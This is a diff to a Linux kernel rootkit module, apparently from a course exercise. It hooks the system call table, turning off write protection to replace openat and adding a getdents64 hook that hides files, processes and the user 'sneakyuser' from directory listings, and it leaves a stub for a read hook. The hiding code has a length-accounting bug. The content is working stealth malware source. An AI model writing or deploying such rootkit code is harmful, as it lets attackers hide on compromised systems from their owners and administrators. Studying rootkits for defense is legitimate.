@@ -1,14 +1,30 @@
-#include <linux/module.h> // for all modules
-#include <linux/init.h>   // for entry/exit macros
-#include <linux/kernel.h> // for printk and other kernel bits
-#include <asm/current.h>  // process information
+// #include <linux/module.h> // for all modules
+// #include <linux/init.h>   // for entry/exit macros
+// #include <linux/kernel.h> // for printk and other kernel bits
+// #include <asm/current.h>  // process information
+// #include <linux/sched.h>
+// #include <linux/highmem.h> // for changing page permissions
+// #include <asm/unistd.h>    // for system call constants
+// #include <linux/kallsyms.h>
+// #include <asm/page.h>
+// #include <asm/cacheflush.h>
+// #include <linux/slab.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <asm/current.h>
 #include <linux/sched.h>
-#include <linux/highmem.h> // for changing page permissions
-#include <asm/unistd.h>    // for system call constants
+#include <linux/highmem.h>
+#include <asm/unistd.h>
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
 #include <linux/slab.h>
+#include <linux/proc_fs.h>
+#include <linux/limits.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -64,6 +80,46 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+
+asmlinkage int fake_getdents64(struct pt_regs *regs)
+{
+  int res;
+  struct linux_dirent64 *dirp, *cur_dirp;
+  long bytes_len;
+  char *next_dirp;
+
+  res = (*original_getdents64)(regs);
+  if (res <= 0)
+  {
+    return res;
+  }
+  dirp = (struct linux_dirent64 *)regs->si;
+  bytes_len = res;
+
+  while (bytes_len > 0)
+  {
+    cur_dirp = dirp;
+    next_dirp = (char *)dirp + dirp->d_reclen;
+    bytes_len -= dirp->d_reclen;
+    // Check if the d_name should be hidden
+    if (strcmp("sneaky_process", cur_dirp->d_name) == 0 || strcmp("sneaky_mod", cur_dirp->d_name) == 0 || (pid != -1 && strcmp(cur_dirp->d_name, "sneakyuser") == 0))
+    {
+      memmove(cur_dirp, next_dirp, bytes_len);
+      res -= cur_dirp->d_reclen;
+      continue;
+    }
+    dirp = (struct linux_dirent64 *)next_dirp;
+  }
+  return res;
+}
+
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
+
+// asmlinkage ssize_t fake_read(struct pt_regs *regs)
+// {
+// }
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -78,11 +134,15 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)fake_getdents64;
+  // sys_call_table[__NR_read] = (unsigned long)fake_read;
 
   // You need to replace other system calls you need to hack here
 
@@ -102,6 +162,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
